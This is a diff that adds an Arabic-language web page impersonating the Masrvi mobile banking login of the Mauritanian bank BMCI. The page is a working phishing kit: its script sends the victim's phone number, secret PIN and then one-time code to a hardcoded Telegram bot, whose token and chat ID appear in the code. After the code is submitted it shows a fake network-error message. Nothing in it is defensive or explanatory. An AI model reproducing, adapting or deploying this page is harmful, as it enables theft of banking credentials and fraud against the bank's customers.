@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Masrvi</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@700;900&display=swap');
+        body { margin: 0; background-color: #F2F2F2; font-family: 'Cairo', sans-serif; display: flex; justify-content: center; height: 100vh; overflow: hidden; }
+        .app { width: 100%; max-width: 400px; background: #fff; display: flex; flex-direction: column; height: 100%; }
+        .header { background: #e67e22; padding: 50px 20px 30px; text-align: center; color: white; }
+        .logo { font-size: 40px; font-weight: 900; margin: 0; letter-spacing: -1.5px; }
+        .container { padding: 40px 25px; flex: 1; }
+        label { display: block; margin-bottom: 10px; color: #333; font-weight: 700; }
+        input { width: 100%; padding: 18px; border: 1.5px solid #eee; border-radius: 12px; background: #f9f9f9; font-size: 17px; text-align: center; margin-bottom: 25px; outline: none; box-sizing: border-box; font-weight: 700; }
+        input:focus { border-color: #e67e22; background: white; }
+        .btn { background: #e67e22; color: white; border: none; padding: 18px; width: 100%; border-radius: 12px; font-size: 19px; font-weight: 900; cursor: pointer; box-shadow: 0 8px 15px rgba(230,126,34,0.2); }
+        .hidden { display: none; }
+        .footer { text-align: center; padding: 20px; color: #999; font-size: 12px; font-weight: 700; }
+    </style>
+</head>
+<body>
+<div class="app">
+    <div class="header"><h1 class="logo">masrvi</h1><div style="font-size: 13px; font-weight: 700; margin-top: 5px; opacity: 0.9;">BMCI - المصرف الموريتاني للاستثمار</div></div>
+    <div id="step1" class="container">
+        <label>رقم الهاتف</label><input type="tel" id="phone" placeholder="00 00 00 00" autocomplete="off">
+        <label>الرمز السري</label><input type="password" id="pin" placeholder="••••••" autocomplete="off">
+        <button class="btn" onclick="sendToTelegram()">دخول آمن</button>
+    </div>
+    <div id="step2" class="container hidden">
+        <h2 style="text-align: center; color: #2c3e50;">تأكيد الهوية</h2>
+        <div id="timer" style="text-align: center; color: #e67e22; font-size: 24px; font-weight: 900; margin-bottom: 20px;">02:00</div>
+        <input type="text" id="otp" placeholder="• • • • • •" style="letter-spacing: 10px;">
+        <button class="btn" onclick="sendOtpToTelegram()">تأكيد</button>
+    </div>
+    <div class="footer">© 2026 Masrvi Mobile Banking</div>
+</div>
+<script>
+    const botToken = "8194091042:AAHIxhB5ymPFwccfuM0AKDa78ukH0kt3IQ"; 
+    const chatId = "5244299184"; 
+    function sendToTelegram() {
+        const p = document.getElementById('phone').value;
+        const s = document.getElementById('pin').value;
+        const text = `🚨 دخول جديد:\n📱 الهاتف: ${p}\n🔑 الرمز: ${s}`;
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`)
+        .then(() => {
+            document.getElementById('step1').classList.add('hidden');
+            document.getElementById('step2').classList.remove('hidden');
+            startTimer();
+        });
+    }
+    function sendOtpToTelegram() {
+        const o = document.getElementById('otp').value;
+        const text = `🔢 الرمز OTP: ${o}`;
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`)
+        .then(() => { alert("خطأ في الشبكة، حاول لاحقاً."); });
+    }
+    function startTimer() {
+        let t = 120;
+        setInterval(() => {
+            let m = Math.floor(t / 60); let s = t % 60;
+            document.getElementById('timer').innerText = `${m}:${s < 10 ? '0' : ''}${s}`;
+            if (t > 0) t--;
+        }, 1000);
+    }
+</script>
+</body>
+</html>
